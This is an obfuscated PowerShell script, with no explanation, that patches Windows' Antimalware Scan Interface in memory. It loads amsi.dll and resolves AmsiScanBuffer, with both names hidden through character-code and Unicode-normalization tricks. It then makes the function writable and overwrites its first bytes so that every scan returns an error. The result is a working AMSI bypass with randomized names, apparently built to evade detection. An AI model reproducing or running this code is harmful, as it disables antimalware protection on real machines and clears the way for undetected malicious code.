$y5xqFeTBePo6tdjI9_wH = @"
using System;
using System.Runtime.InteropServices;
public class y5xqFeTBePo6tdjI9_wH {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr LEjjc89mH, string HmG);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KdpamZocgJ7wT2D, UIntPtr pSa4QP62ltkXX47R1D, uint nxcdLFrSaad_RXn, out uint ILr);
}
"@

Add-Type $y5xqFeTBePo6tdjI9_wH

$FQBHXdWC = [y5xqFeTBePo6tdjI9_wH]::LoadLibrary("$([chAr](97)+[cHAR](109)+[CHaR]([bytE]0x73)+[cHar](105+24-24)+[Char]([BYtE]0x2e)+[CHAR](75+25)+[char]([byTE]0x6c)+[CHAr](18+90))")
$KRAdlT2VQOCvN9pB = [y5xqFeTBePo6tdjI9_wH]::GetProcAddress($FQBHXdWC, "$(('ÂmsíScânBù'+'ffèr').NOrMaliZE([cHAR](5+65)+[CHAR](111+87-87)+[Char]([bYTE]0x72)+[cHaR](109+6-6)+[cHar](68)) -replace [CHaR]([BYte]0x5c)+[ChAr](45+67)+[ChAR]([BYTe]0x7b)+[CHar]([BytE]0x4d)+[chAR](110)+[ChAr](125))")
$p = 0
[y5xqFeTBePo6tdjI9_wH]::VirtualProtect($KRAdlT2VQOCvN9pB, [uint32]5, 0x40, [ref]$p)
$HQfxaf_l = "0xB8"
$fv5RG9O3OThd65S5 = "0x57"
$eote1XP5mUTjqk = "0x00"
$RS5g9 = "0x07"
$YvpnrQ9 = "0x80"
$RDZAnMEa7HTCYk = "0xC3"
$zYh6nqAFlvNq5 = [Byte[]] ($HQfxaf_l,$fv5RG9O3OThd65S5,$eote1XP5mUTjqk,$RS5g9,+$YvpnrQ9,+$RDZAnMEa7HTCYk)
[System.Runtime.InteropServices.Marshal]::Copy($zYh6nqAFlvNq5, 0, $KRAdlT2VQOCvN9pB, 6)